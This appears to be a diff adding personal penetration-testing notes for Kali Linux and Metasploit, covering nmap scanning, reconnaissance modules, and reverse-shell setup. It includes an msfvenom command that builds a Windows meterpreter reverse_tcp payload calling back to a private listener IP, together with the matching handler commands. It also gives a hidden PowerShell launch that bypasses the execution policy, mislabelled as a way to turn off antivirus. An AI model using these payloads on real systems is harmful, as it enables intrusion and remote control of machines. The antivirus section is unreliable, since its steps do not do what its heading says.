@@ -1,0 +1,66 @@
+Update kali linux
+
+apt-get update && apt-get upgrade
+
+# launch Metasploit#
+
+ sudo msfconsole
+ locate metasploit => /usr/share/metasploit-framework
+ cd /usr/share/metasploit-framework
+#
+nmap -v -Pn 192.168.1.241
+
+# Websites
+: securetofocus.com
+: exploitdb.com
+
+: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 LPORT=4444 -f psh-cmd
+
+mfs6: use exploit/multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+show options
+
+set LHOST 192.168.1.145
+
+msfconsole
+
+show options
+
+exploit
+
+###Turn off Antivirus Protection on Windows 11##
+1. Open non-admin command prompt window.
+2. Copy the this: "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit" less the quotes and paste into command prompt window. Then press the Enter key.
+
+## Information gathering ##
+
+msfconsole
+
+whois <domain name>
+
+use auxiliary/gather/search_email_collector
+
+show options
+
+set domain <domain name>
+
+run
+
+# Telnet version scanner #
+
+use auxiliary/scanner/telnet/telnet_version
+
+show options
+
+set RHOSTS <target ip address>
+
+run
+
+https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules/auxiliary/scanner
+
+https://www.geeksforgeeks.org/list-of-auxiliary-module-reference-in-metasploit/
+https://www.geeksforgeeks.org/
+
+https://www.geeksforgeeks.org/python-programming-language-tutorial/
